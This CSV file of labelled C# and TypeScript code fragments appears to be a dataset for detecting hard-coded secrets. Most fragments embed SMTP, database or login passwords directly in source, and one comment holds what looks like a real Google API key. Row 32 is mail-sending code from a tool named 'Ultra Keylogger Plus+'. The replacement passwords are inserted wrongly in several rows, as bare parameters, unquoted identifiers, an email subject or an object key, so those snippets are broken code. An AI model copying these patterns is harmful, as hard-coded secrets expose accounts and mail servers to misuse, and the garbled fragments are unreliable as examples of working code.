,Input,Output,Lang
12,"SmtpClient client = new SmtpClient();
client.Port = 25;
client.Host = ""smtp-mail.outlook.com"";
client.EnableSsl = true;
client.Timeout = 10000;
client.UseDefaultCredentials = false;
client.Credentials = new System.Net.NetworkCredential(<EMAIL>, ""Elperroloco123"");
//string recipient = adminNo + ""@mymail.nyp.edu.sg"";
MailMessage mail = new MailMessage(<EMAIL>, ""170313Q@mymail.nyp.edu.sg"");
mail.Subject = ""You are scheduled for an interview!"";
mail.Body = ""The interview will be on "" + emailDate + "", "" + emailTime;
client.Send(mail);
return emailDate + emailTime;",1,cs
13,"SmtpClient client = new SmtpClient();
client.Port = 25;
client.Host = ""smtp-mail.outlook.com"";
client.EnableSsl = true;
client.Timeout = 10000;
client.UseDefaultCredentials = false;
client.Credentials = new System.Net.NetworkCredential(<EMAIL>, ""Elpaso13"");
MailMessage mail = new MailMessage(<EMAIL>, ""170313Q@mymail.nyp.edu.sg"");
if (e.CommandName == ""Approve"")
{
mail.Subject = ""You were approved for the trip"";
mail.Body = ""Dear Peh Boon Wah,\nThis is regarding the trip you sign up for: "" + interview.tripName + ""\nTo confirm your request, login and go to http://eadlab520190123024847.azurewebsites.net/chooseOffer.aspx?tripId=""+interview.tripid+""\nYours sincerely,\n""+interview.staffName;
client.Send(mail);",1,cs
14,"mmsg.IsBodyHtml = true;
mmsg.AlternateViews.Add(NewPasswordEmail(nombre, sb.ToString()));
mmsg.From = new System.Net.Mail.MailAddress(<EMAIL>);
System.Net.Mail.SmtpClient cliente = new System.Net.Mail.SmtpClient();
cliente.EnableSsl = true;
//cliente.UseDefaultCredentials = false;
cliente.Credentials = new System.Net.NetworkCredential(<EMAIL>, ""Elpana1"");
cliente.Host = ""smtp.gmail.com"";
cliente.Port = 25;
cliente.Send(mmsg);
}
catch (Exception ex)
{",1,cs
15,"MailMessage Email = new MailMessage();
Email.From = new MailAddress(<EMAIL>); // otro cambio si modifico el correo
Email.To.Add(Correo);
Email.Subject = ""Activacin de la cuenta"";
string Body = HttpContent(""http://www.unprofesorya.com/Correo_Activacion.aspx""); // recordar que debo cambiarla
string Body1 = Body.Replace(""NICKUSUARIO"", Usuario);
string Body2 = Body1.Replace(""Eloysuis2"", Password_1);
Email.Body = Body2;
Email.IsBodyHtml = true;
MailMessage Mio = new MailMessage();
Mio.From = new MailAddress(<EMAIL>);
Mio.To.Add(<EMAIL>);
Mio.Subject = ""Registro en Aprobacion"";",1,cs
16,"MailMessage Correo = new MailMessage();
Correo.From = new MailAddress(<EMAIL>); // otro cambio si modifico el correo
Correo.To.Add(BU.Metodo_Reenviar_Activacion_Al_Usuario(Usuario, ID_Empresa).Correo);
Correo.Subject = ""Activacin de la cuenta"";
string Body = HttpContent(""http://www.unprofesoya.com/Correo_Activacion.aspx""); // recordar que debo cambiarla
string Body1 = Body.Replace(""NICKUSUARIO"", Usuario);
string Body2 = Body1.Replace(""CONTRASENA"", BU.Metodo_Reenviar_Activacion_Al_Usuario(Usuario, ID_Empresa).Password);
Correo.Body = Body2;
Correo.IsBodyHtml = true;
SmtpClient smtp = new SmtpClient(""smtp.gmail.com"");
smtp.Port = 587;
smtp.Credentials = new NetworkCredential(<EMAIL>, ""qsoiqzuliwweyeog""); // otro cambio si modifico el correo
smtp.EnableSsl = true;",1,cs
17,"using System.Windows.Media;
using System.Windows.Navigation;
using System.Windows.Threading;
public partial class Login : UserControl
{
private FacebookClient facebookClient;
private const string Appid = ""1677950655708399"";
private Uri _accessUri;
private const string baseUri = ""https://graph.facebook.com/oauth/authorize?"";
public String AccessToken { get; set; }
public Login()
{
InitializeComponent();",1,cs
18,"mail.Subject = ""[NoFraud] Recover your username and password!"";
mail.Body = ""<h1>Here are your credentials!</h1>"";
mail.Body += ""<h3>username:"" + user.Username + ""</h3>"";
mail.Body += ""<h3>password:"" + user.Password + ""</h3>"";
mail.IsBodyHtml = true;
using SmtpClient smtp = new SmtpClient(""smtp.gmail.com"", 587);
smtp.Credentials = new System.Net.NetworkCredential(<EMAIL>, ""Elouise1"");
smtp.EnableSsl = true;
smtp.Send(mail);
return 1;
}
}
catch (Exception ex)",1,cs
19,", string Account
, Elora1)
{
SmtpClient smtp = new SmtpClient(); //SmtpClient
smtp.DeliveryMethod = SmtpDeliveryMethod.Network; //smtp Network
smtp.EnableSsl = false;//smtpSSL
smtp.Host = ""smtp.126.com""; // smtp
smtp.Port = 25; // smtp 25
//SMTP
smtp.UseDefaultCredentials = true;
//
smtp.Credentials = new NetworkCredential(Account, Password);
MailMessage Message = new MailMessage(); //",1,cs
20,"if (ValidateEmailAddr(destination) == false) return ""Invalid Destination: "" + destination;
MailMessage mailMsg = new MailMessage(From, destination, subject, msg);
SmtpClient client = new SmtpClient(""smtp.gmail.com"", 587);
client.EnableSsl = true;
//NetworkCredential receives a login and password. You have to allow 3rd party access on the GOOGLE ACCOUNT for this code to work.
//It won't work if account has 2FA enabled.. so disable it.
NetworkCredential cred = new NetworkCredential(""anyAccountWithout2FAandAllowed3rdPartyConnections@gmail.com"", ""Elonzo21""); // <------------PUT A VALID GOOGLE ACCOUNT AND PASSWORD !!!!!!!!!!
client.Credentials = cred;
client.Send(mailMsg);
return ""Message Sent to "" + destination + "" at "" + DateTime.Now.ToString() + ""."";
}
catch (Exception ex)
{",1,cs
21,"SmtpClient smtp = new SmtpClient();
smtp.Host = ""smtp.gmail.com"";
smtp.Port = 587;
smtp.EnableSsl = true;
smtp.UseDefaultCredentials = false;
smtp.Credentials = new System.Net.NetworkCredential
(<EMAIL>, ""Elon05"");// Enter senders User name and password
smtp.Send(mail);
//Email Logic
return View(""Thanks"", guestResponse);
}
return View();
}",1,cs
22,"smtp.EnableSsl = true;
smtp.UseDefaultCredentials = false;
smtp.Credentials = new System.Net.NetworkCredential
(<EMAIL>, ""Eloise23"");// Enter senders User name and password
smtp.Send(mail);
//Email Logic
return View(""Thanks"", guestResponse);
}
return View();
}
[HttpGet]
public ActionResult Thanks()
{",1,cs
23,"IsBodyHtml = true
};
SmtpClient smtpClient = new SmtpClient(""smtp.gmail.com"")
{
UseDefaultCredentials = false,
DeliveryMethod = SmtpDeliveryMethod.Network,
Credentials = new NetworkCredential(<EMAIL>, ""Eloijye13""),
Port = 587,
EnableSsl = true
};
mail.Subject = ""Contact Form Submission"";
// Build body
mail.Body = $@""<p>Contact form submission received on { DateTime.Now.ToString(""MM/dd/yyyy"") } @ { DateTime.Now.ToString(""h:mm tt"") }</p>",1,cs
24,"}
return View();
}
public static void SendEmail(string title, string text,string email)
{
SmtpClient smtpClient = new SmtpClient(""smtp.gmail.com"", 587);
smtpClient.Credentials = new System.Net.NetworkCredential(<EMAIL>, ""Elohim1175"");
//smtpClient.UseDefaultCredentials = true;
//smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
smtpClient.EnableSsl = true;
MailMessage mail = new MailMessage(<EMAIL>, email);
//Setting From , To and CC
mail.From = new MailAddress(<EMAIL>, ""Showvey"");",1,cs
25,"}
//Push Notification
//[AutomaticRetry(Attempts =0,OnAttemptsExceeded =AttemptsExceededAction.Fail)]
public string SendNotification(string ApiKey, string SenderId, List<string> deviceRegIds, string message, string title)
{
//string SERVER_API_KEY = Configuration[PushNotification:SERVER_API_KEY]; //""AIzaSyDWqnTI0BCLgwCNZyo4up-mP8pppWbDJvk"";
//var SENDER_ID = Configuration[PushNotification:SENDER_ID]; // ""303034529306"";
string regIds = string.Join(""\"",\"""", deviceRegIds);
NotificationMessage nMessage = new NotificationMessage();
nMessage.title = title;
nMessage.body = message;
nMessage.icon = """";
NotificationData nData = new NotificationData() { Title = title, Message = message };",1,cs
26,"//BEGIN LOCAL SERVER HOSTED VERSION
//smtp.Host = ""smtp.gmail.com"";
//smtp.Port = 587;
//smtp.EnableSsl = true;
//smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
//smtp.UseDefaultCredentials = false;
//smtp.Credentials = new NetworkCredential(<EMAIL>, ""Elodia107"");
//string body = ""Please confirm your account by clicking <a href=\"""" + callbackUrl + ""\"">here</a>"";
//using (var message = new MailMessage(<EMAIL>, model.Email))
//{
// message.Subject = ""Test"";
// message.Body = body;
// message.IsBodyHtml = true;",1,cs
27,"//BEGIN WEB SERVER HOSTED VERSION
smtp.Host = ""relay-hosting.secureserver.net"";
smtp.Port = 25;
smtp.EnableSsl = false;
smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
smtp.UseDefaultCredentials = false;
smtp.Credentials = new NetworkCredential(""ph14185669651"", ""EloElo9"");
string body = ""Please confirm your account by clicking <a href=\"""" + callbackUrl + ""\"">here</a>"";
using (var message = new MailMessage(<EMAIL>, model.Email))
{
message.Subject = ""Confirm your e-mail address."";
message.Body = body;
message.IsBodyHtml = true;",1,cs
28,"//BEGIN LOCAL SERVER HOSTED VERSION
//smtp.Host = ""smtp.gmail.com"";
//smtp.Port = 587;
//smtp.EnableSsl = true;
//smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
//smtp.UseDefaultCredentials = false;
//smtp.Credentials = new NetworkCredential(<EMAIL>, ""ElnoRa08"");
//string body = ""Please reset your password by clicking <a href=\"""" + callbackUrl + ""\"">here</a>"";
//using (var message = new MailMessage(<EMAIL>, model.Email))
//{
// message.Subject = ""Reset password."";
// message.Body = body;
// message.IsBodyHtml = true;",1,cs
29,"//BEGIN WEB SERVER HOSTED VERSION
smtp.Host = ""relay-hosting.secureserver.net"";
smtp.Port = 25;
smtp.EnableSsl = false;
smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
smtp.UseDefaultCredentials = false;
smtp.Credentials = new NetworkCredential(""ph14185669651"", """");
string body = ""Please reset your password by clicking <a href=\"""" + callbackUrl + ""\"">here</a>"";
using (var message = new MailMessage(<EMAIL>, model.Email))
{
message.Subject = ""Elnegro1"";
message.Body = body;
message.IsBodyHtml = true;",1,cs
30,"const string subject = ""Test mail"";
var smtp = new SmtpClient
{
Host = ""smtp.gmail.com"",
Port = 587,
EnableSsl = true,
DeliveryMethod = SmtpDeliveryMethod.Network,
UseDefaultCredentials = false,
Credentials = new NetworkCredential(fromAddress.Address, Elmorox100)
};
var message = new MailMessage(fromAddress, toAddress);
message.Subject = subject;
message.IsBodyHtml = true;",1,cs
31,"// //
// client.Host = ""smtp.163.com"";
// //
// client.Timeout = 3000;
// // SMTP
// client.DeliveryMethod = SmtpDeliveryMethod.Network;
// // SMTP25 465
// client.Port = 25;
// //ssl
// client.EnableSsl = true;
// ///
// client.UseDefaultCredentials = false;
// // 163 @163.com",1,cs
32,"MailAddress Send = new MailAddress(<EMAIL>, ""UKP32+"");
MailAddress Recieve = new MailAddress(email);
MailMessage message = new MailMessage(Send, Recieve);
message.Sender = new MailAddress(<EMAIL>, ""UKP32+"");
message.Subject = ""Just Checking..."";
message.Body = ""Hello!\n\nThis is an automated email sent from Ultra Keylogger Plus+.\n\nkthxbai"";
SmtpClient emailClient = new SmtpClient();
emailClient.UseDefaultCredentials = false;
emailClient.Credentials = new System.Net.NetworkCredential(<EMAIL>, ""Elmokitty1"");
emailClient.Host = ""smtp.gmail.com"";
emailClient.Port = 587;
emailClient.EnableSsl = true;
emailClient.Timeout = 20000;",1,cs
33,"using (MailMessage mm = new MailMessage(<EMAIL>, emailAddress))
{
mm.Subject = subject;
mm.Body = body;
mm.IsBodyHtml = true;
SmtpClient smtp = new SmtpClient();
smtp.Host = ""smtp.gmail.com"";
smtp.EnableSsl = true;
NetworkCredential NetworkCred = new NetworkCredential(<EMAIL>, ""ElmoRox7"");
smtp.UseDefaultCredentials = true;
smtp.Credentials = NetworkCred;
smtp.Port = 587;
smtp.Send(mm);",1,cs
34,"string subject = ""Datos de cuenta"";
string body = ""Nombre: "" + toname + ""\n""
+ "" Clave: "" + clave + ""\n""
+ "" Correo: "" + to + ""\n""
+ "" Contrasea: "" + Elmo94 + ""\n""
+ "" Tipo de usuario: "" + tipo + ""\n""
+ ""Inicia sesin en la siguiente direccion: http://vivi.ens.uabc.mx/GePE/Login/Login.aspx"";
var smtp = new SmtpClient
{
Host = ""smtp.gmail.com"",
Port = 587,
EnableSsl = true,
DeliveryMethod = SmtpDeliveryMethod.Network,",1,cs
35,"//configure email data
MailMessage mailMessage = new MailMessage();
mailMessage.From = new MailAddress(<EMAIL>);
mailMessage.To.Add(new MailAddress(EmailTo));
mailMessage.Body = body;
mailMessage.IsBodyHtml = true;
mailMessage.Subject = EmailObject;
//Configure Client
SmtpClient client = new SmtpClient(""smtp.gmail.com"");
client.Port = 587;
client.Credentials = new NetworkCredential(<EMAIL>, ""Elmal666"");
client.EnableSsl = true;
client.Send(mailMessage);",1,cs
36,"moduleId: module.id,
templateUrl: ""./login.component.html"",
})
export class LoginComponent {
@ViewChild(""btn"", { static: true }) btn: ElementRef;
public email: string = <EMAIL>;
public password: string = ""Ellymae07"";
constructor(
private page: Page,
private auth: AuthService,
private router: RouterExtensions
) {
this.page.actionBarHidden = true;",1,ts
37,"})
.register(fastifyJwt, { secret: process.env.SECRET || 'secret' })
.register(swagger);
routes(fastify);
fastify.ready(() => {
createConnection({
type: 'postgres',
host: String(process.env.DB_HOST),
port: Number(process.env.DB_PORT),
username: String(process.env.DB_USERNAME),
password: String(process.env.DB_PASSWORD),
database: String(process.env.DB_DATABASE),
entities: [__dirname + '/**/*.entity{.ts,.js}'],",1,ts
38,"import {ApolloServer} from 'apollo-server-express';
import {resolvers, typeDefs} from './graphql';
import {User, Favourite, Chat, Message, Ride} from './entities';
import {ApolloCtx} from './lib/types';
const main = async () => {
await createConnection({
type: 'postgres',
database: process.env.PG_DB_NAME,
username: process.env.PG_DB_USERNAME,
password: process.env.PG_DB_PASSWORD,
logging: true,
synchronize: true,
migrations: [path.join(__dirname, './migrations/*')],",1,ts
39,"this.service.getAllUsers().subscribe(u => {
this.users = u;
});
}
isValid(){
let admin_userName=<EMAIL>;
let admin_password=""admin123"";
let userName = this.loginForm.controls.username.value;
let password = this.loginForm.controls.password.value;
if((userName == admin_userName) && (password == admin_password)){
this.router.navigate([admin]);
}else{
if( this.login(userName, password)){",1,ts
40,"}),
GraphQLModule.forRoot({
autoSchemaFile: true,
context: ({ req }) => ({ user: req[user] }),
}),
TypeOrmModule.forRoot({
type: 'postgres',
host: process.env.DB_HOST,
port: +process.env.DB_PORT,
username: process.env.DB_USERNAME,
password: process.env.DB_PASSWORD,
database: process.env.DB_NAME,
synchronize: process.env.NODE_ENV !== 'prod',",1,ts
41,"return {
timezone: '+08:00',
// migrations false
//
synchronize: false,
// .env settings
type: this.type as 'mysql' | 'mariadb',
host: this.host,
port: this.port,
username: this.username,
password: this.password,
database: this.database,
entities: this.entities,",1,ts
42,"public TodoSequelizeModel: any;
getConnection(): Sequelize {
return this.connection;
}
async connect(): Promise<void> {
this.connection = new Sequelize({
dialect: 'mariadb',
host: process.env.MYSQL_HOST,
username: process.env.MYSQL_ROOT_USER,
password: process.env.MYSQL_ROOT_PASSWORD,
database: process.env.MYSQL_DATABASE,
});
this.TodoSequelizeModel = useTodoSequelizeModel(this.connection);",1,ts
43,"private username: string;
private password: string;
private host: string;
private port: number;
private schema: 'http' | 'https';
constructor(options: { host: string, port?: number, schema?: 'https' | 'http', username?: string, password: string }) {
this.username = options.username || 'root@pam';
this.password = options.password;
this.host = options.host;
this.port = options.port || 8006;
this.schema = options.schema || 'https';
if (!this.password) {
const msg = `password is missing for Proxmox connection`;",1,ts
44,"import { TypeOrmModule } from '@nestjs/typeorm';
import { resolve } from 'path';
@Global()
@Module({
imports: [
TypeOrmModule.forRoot({
type: 'postgres',
host: 'db',
port: 5432,
username: process.env.POSTGRES_USER,
password: process.env.POSTGRES_PASSWORD,
database: process.env.POSTGRES_DB,
synchronize: true,",1,ts
45,"import { getAvgs } from '../utils';
import { testData, cartData } from '../data/test';
let db = mysql.createPool({
host: config.NODE_ENV === 'production' ? '40.79.17.32' : '127.0.0.1',
user: 'root',
password: config.NODE_ENV === 'production' ? '' : '',
database: 'cartdb',
port: 3306
});
export const changeDB = async (req: Request, res: Response): Promise<void> => {
const { database } = req.query;
if (database === 'product_db')
db = mysql.createPool({",1,ts
46,"export class LoginComponent {
errorMessage: string;
ErrorExternalLogin: string = '';
errorMessageVersion: string = '1.426';
software_version_string: string = '1.426';
username: string = 'ADMIN';
password: string = 'ElliewWilkes123';
server_software_version_string: string = '';
showloginbutton: boolean = true;
company_code: string = '';
loading = false;
showlogin = false;
CompanyList: Companym[] = [];",1,ts
47,"/** defining signin functionality for user signIn */
signIn(email, password) {
this.auth0.redirect.loginWithCredentials({
connection: 'Username-Password-Authentication',
email: email.value,
password: password.value,
scope: 'openid'
});
}
/** defining function for google logged in */
oAuthGoogleLogin() {
// Trigger login with google
this.auth0.authorize({",1,ts
48,"import { createConnection, Connection } from 'typeorm'
import { Book } from ""./entities/book"";
import { buildSchema } from ""type-graphql"";
import { BookResolver } from ""./resolver/resolver"";
const main = async () => {
const connection: Connection = await createConnection({
type: 'postgres',
host: 'project_db',
port: 5432,
username: 'nurrizkyimani',
password: 'Elizabeth888',
database: 'coba1',
logging: true,",1,ts
49,"const config: IConfig = {
NODE: {
ENV: env.NODE_ENV,
PORT: env.PORT,
},
DATABASE: {
TYPE: 'postgres',
URL: env.DATABASE_URL,
SSL: env.DATABASE_SSL,
SYNCHRONIZE: env.DATABASE_SYNCHRONIZE,
DROP_SCHEMA: env.DATABASE_DROP_SCHEMA,
LOGGING: env.DATABASE_LOGGING,
ENTITIES: 'entities/**/*.{ts,js}',",1,ts
50,"MAILGUN_API_KEY: Joi.string().required(),
MAILGUN_DOMAIN_NAME: Joi.string().required(),
MAILGUN_FROM_EMAIL: Joi.string().required(),
})
}),
TypeOrmModule.forRoot({
type: 'postgres',
host: process.env.DB_HOST,
port: +process.env.DB_PORT,
username: process.env.DB_USERNAME,
password: process.env.DB_PASSWORD,
database: process.env.DB_NAME,
synchronize: process.env.NODE_ENV !== 'prod',",1,ts
51,"import { User } from './entities/User';
const main = async () => {
const con = await createConnection({
host: process.env.POSTGRES_HOST,
username: process.env.POSTGRES_USER,
password: process.env.POSTGRES_PASSWORD,
database: process.env.POSTGRES_NAME || 'muneddit',
type: 'postgres',
logging: !__prod__,
synchronize: !__prod__,
entities: [Post, User],
});
const app = express();",1,ts
52,"export const databaseProviders: FactoryProvider[] = [
{
provide: DB_CONN_TOKEN,
inject: [ConfigService],
useFactory: async (configService: ConfigService) =>
await createConnection({
type: 'postgres',
host: configService.get('database.host'),
port: configService.get('database.port'),
database: configService.get('database.name'),
username: configService.get('database.user'),
password: configService.get('ElinEmma2'),
entities: [path.join(__dirname, '..', '**', '*.entity{.ts,.js}')],",1,ts
53,"await pgClient.end();
}
protected async initSequelize() {
this.sequelize = new Sequelize({
//logging: console.log,
logging: false,
dialect: ""postgres"",
host: this.app.config.host,
port: this.app.config.port,
username: this.app.config.username,
password: this.app.config.password,
database: ""bar""
});",1,ts
54,"PASSWORD,
NODE_ENV,
} = process.env;
const _prod = NODE_ENV === ""production"";
console.log(_prod);
export default {
type: ""postgres"",
host: HOST,
url: DATABASE_URL,
database: DATABASE,
username: USERNAME,
password: PASSWORD,
port: 5432,",1,ts
55,"AWS_USER: Joi.string().required(),
AWS_KEY: Joi.string().required(),
AWA_SECRET_KEY: Joi.string().required(),
}),
}),
TypeOrmModule.forRoot({
type: 'postgres',
host: process.env.DB_HOST,
port: +process.env.DB_PORT,
username: process.env.DB_USERNAME,
password: process.env.DB_PASSWORD,
database: process.env.DB_DATABASE,
synchronize: process.env.NODE_ENV !== 'prod',",1,ts
56,"const isProd = env === 'production';
await createConnection({
type: 'mysql',
host: isProd ? 'sql10.freemysqlhosting.net' : 'localhost',
port: 3306,
username: isProd ? 'sql10371019' : 'root',
password: isProd ? '' : '',
database: isProd ? 'sql10371019' : 'Ejercicio',
entities: [
path.join(__dirname, '../entity/**/**.ts')
],
synchronize: true
});",1,ts
57,"import {HttpClient, HttpHeaders} from '@angular/common/http';
@Injectable({
providedIn: 'root'
})
export class LoginService {
private client_id: string = ""bookstore"";
private client_secret: string = """";
constructor(private _http: HttpClient) {
}
sendCredemtial(credential) {
let url = 'http://localhost:8080/oauth/token';
let userInfo = {
'username': credential.username, ""Ek595enl"": credential.password, 'grant_type': ""password""",1,ts
58,"connectionLimit: DB_LIMIT,
host: DB_ADDRESS,
port: DB_PORT,
user: DB_USER,
password: DB_PASS,
database: DB_NAME,
charset: 'utf8mb4',
});
this.db = await connectionPool;
this.$entry = new ServerDBEntry(this.db);
this.$analysis = new ServerDBAnalysis(this.db);
}
async disconnect(): Promise<void> {",1,ts
59,"styleUrls: [./sighn-in.component.css]
})
export class SighnInComponent implements OnInit {
hide: boolean = true;
//!!!!!!!!!!!!!!!!!!!!!binding
emailAddress: string = <EMAIL>;
password: string = ""Eggo1975Coco1978"";
public form: FormGroup = new FormGroup({
password: new FormControl('',),
emailAddress: new FormControl('', [Validators.required, Validators.email]),
});
constructor(private dbService: DbService, private router: Router) {
}",1,ts
60,"import { Admin } from '../apps/admin/admin.entity';
import { User } from '../apps/user/user.entity';
import { Tasks } from '../apps/tasks/tasks.entity';
export function initDatabase() {
createConnection({
type: 'postgres',
host: '127.0.0.1',
port: 5432,
username: 'key_pay',
password: process.env.DB_PWD ?? 'Eggamoe0',
database: 'key_pay',
entities: [Admin, User, Tasks],
synchronize: false,",1,ts
61,"import { COOKIE_NAME, __prod__ } from './constants';
import { User } from './entities/User';
import { Post } from './entities/Post';
const main = async () => {
const conn = await createConnection({
type: 'postgres',
database: 'lireddit2',
username: 'postgres',
password: 'Eecs890606wp',
logging: true,
synchronize: true,
entities: [Post, User],
});",1,ts
62,"@Injectable({
providedIn: 'root'
})
export class AuthService {
constructor(private http: HttpClient) { }
login(credentials): Observable<any> {
return this.http.post(AUTH_API + 'signin', {
username: credentials.username,
password: credentials.password
}, h",1,ts
